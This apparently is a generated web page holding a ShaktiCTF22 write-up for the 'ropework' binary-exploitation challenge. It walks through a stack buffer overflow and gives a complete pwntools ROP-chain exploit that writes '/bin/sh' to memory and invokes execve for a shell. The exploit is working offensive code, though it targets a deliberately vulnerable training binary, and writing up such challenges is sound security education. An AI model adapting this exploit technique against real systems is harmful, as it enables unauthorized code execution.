@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF22/pwn/ropework/writeup/">
+        <link rel="shortcut icon" href="../../../../img/favicon.ico">
+        <title>ropework - CTF-Writeups</title>
+        <link href="../../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+        <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+
+        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+            <div class="container">
+
+                <!-- Collapsed navigation -->
+                <div class="navbar-header">
+                    <!-- Expander button -->
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
+                </div>
+
+                <!-- Expanded navigation -->
+                <div class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li >
+                                <a href="../../../../about/">About Us</a>
+                            </li>
+                            <li >
+                                <a href="../../../../shaktictf/">ShaktiCTF</a>
+                            </li>
+                            <li >
+                                <a href="https://team-shakti.github.io/">Website</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav navbar-right">
+                        <li>
+                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF22/pwn/ropework/writeup.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
+    <ul class="nav bs-sidenav">
+        <li class="main active"><a href="#ropework">ropework</a></li>
+            <li><a href="#preliminary-analysis">Preliminary Analysis:</a></li>
+            <li><a href="#understanding-the-challenge">Understanding the challenge:</a></li>
+            <li><a href="#exploitation">Exploitation:</a></li>
+            <li><a href="#exploit">Exploit:</a></li>
+    </ul>
+</div></div>
+                <div class="col-md-9" role="main">
+
+<h1 id="ropework">ropework</h1>
+<p>Author: <a href="https://twitter.com/BhaskaraShravya">d1g174l_f0rtr355</a></p>
+<p>Solves: 9</p>
+<p>Difficulty: Medium</p>
+<h2 id="preliminary-analysis">Preliminary Analysis:</h2>
+<p>We notice that the binary is a 64-bit non-stripped binary with the folloeing protections:</p>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+
+</code></pre>
+
+<h2 id="understanding-the-challenge">Understanding the challenge:</h2>
+<p>The binary itself is very simple:</p>
+<pre><code>  char s[16]; // [rsp+0h] [rbp-10h] BYREF
+
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  system(&quot;echo 'The fisherman is trying to untangle his fishing knots. If you could help him with it, it would be great!\n'&quot;);
+  fgets(s, 329, stdin);
+  system(&quot;echo 'Ok bye!\n'&quot;);
+  return 0;
+</code></pre>
+
+<p>Since there is no other function to return to and with PIE being disabled, we can begin our exploitation by creating a suitable ROP chain. There could be other ways pf creating the ROP chain with the available gadgets. I would be showing one of those methods.</p>
+<h2 id="exploitation">Exploitation:</h2>
+<p>The ROP chain is made up of the following instructions:</p>
+<pre><code>pop_rdi = 0x0000000000401273# pop rdi ; ret
+pop_rsi = 0x0000000000401271# pop rsi ; pop r15 ; ret
+pop_r12 = 0x000000000040126c# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+
+xor_rax_rax = 0x0000000000401182# 
+xor_rax_rbx = 0x0000000000401186
+xor_rbx_rbx = 0x000000000040118a
+xor_rdx_rbx = 0x000000000040118e
+xor_rdx_rdx = 0x0000000000401192
+
+mov_rbx_r10 = 0x000000000040117e
+movq_rdx_r10 = 0x000000000040119e# mov qword ptr [rdx], r10 ; ret
+
+xor_r10_r10 = 0x0000000000401196
+xor_r10_r12 = 0x000000000040119a
+
+ret = 0x0000000000401205
+syscall = 0x00000000004011a2
+</code></pre>
+
+<p>Upon xorring two same registers, the registers get nulled out. We can transfer the contents of a register to another using xor with the help of a similar technique. Since anything xorred with 0 is the number itself, we make use of this concept to eventually place the string "/bin/sh" into a bss address. We then pop the address into register <code>rdi</code>. We also set <code>rax</code> to contain <code>0x3b</code> and null out registers <code>rsi</code> and <code>rdx</code> before making the syscall.</p>
+<h2 id="exploit">Exploit:</h2>
+<pre><code>from pwn import *
+
+p = process('./ropework')
+#gdb.attach(p, gdbscript='set follow-fork-mode parent\n')
+#p = remote('localhost', 4008)
+p.recvline()
+
+'''
+gadgets
+'''
+pop_rdi = 0x0000000000401273
+pop_rsi = 0x0000000000401271
+pop_r12 = 0x000000000040126c
+
+xor_rax_rax = 0x0000000000401182
+xor_rax_rbx = 0x0000000000401186
+xor_rbx_rbx = 0x000000000040118a
+xor_rdx_rbx = 0x000000000040118e
+xor_rdx_rdx = 0x0000000000401192
+
+mov_rbx_r10 = 0x000000000040117e
+movq_rdx_r10 = 0x000000000040119e
+
+xor_r10_r10 = 0x0000000000401196
+xor_r10_r12 = 0x000000000040119a
+
+ret = 0x0000000000401205
+syscall = 0x00000000004011a2
+
+bss = 0x404030
+
+pay = 'a'*0x10
+pay += 'b'*0x8
+pay += p64(ret)# leave_ret
+
+pay += p64(pop_r12)
+pay += p64(bss)
+pay += p64(0x0)
+pay += p64(0x0)
+pay += p64(0x0)
+
+pay += p64(xor_r10_r10)
+pay += p64(xor_r10_r12)
+
+pay += p64(xor_rbx_rbx)
+pay += p64(mov_rbx_r10)
+
+pay += p64(xor_rdx_rdx)
+pay += p64(xor_rdx_rbx)
+
+pay += p64(pop_r12)
+pay += p64(u64(&quot;/bin/sh\x00&quot;))
+pay += p64(0x0)
+pay += p64(0x0)
+pay += p64(0x0)
+
+pay += p64(xor_r10_r10)
+pay += p64(xor_r10_r12)
+
+pay += p64(movq_rdx_r10)
+
+pay += p64(pop_rdi)
+pay += p64(bss)
+
+pay += p64(pop_r12)
+pay += p64(0x3b)
+pay += p64(0x0)
+pay += p64(0x0)
+pay += p64(0x0)
+
+pay += p64(xor_r10_r10)
+pay += p64(xor_r10_r12)
+
+pay += p64(xor_rbx_rbx)
+pay += p64(mov_rbx_r10)
+pay += p64(xor_rax_rax)
+pay += p64(xor_rax_rbx)
+
+pay += p64(xor_rdx_rdx)
+
+pay += p64(pop_rsi)
+pay += p64(0x0)
+pay += p64(0x0)
+
+#pay += p64(xor_rbx_rbx)
+
+pay += p64(syscall)
+#pay += p64(ret)
+
+print(len(pay))
+p.sendline(pay)
+p.interactive()
+
+</code></pre></div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 <a href="http://Team-Shakti.github.io/">Team-Shakti Writeups</a></p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../../..",
+                shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
+        </script>
+        <script src="../../../../js/base.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
+            </div>
+            <div class="modal-body">
+                <p>
+                    From here you can search these documents. Enter
+                    your search terms below.
+                </p>
+                <form role="form">
+                    <div class="form-group">
+                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
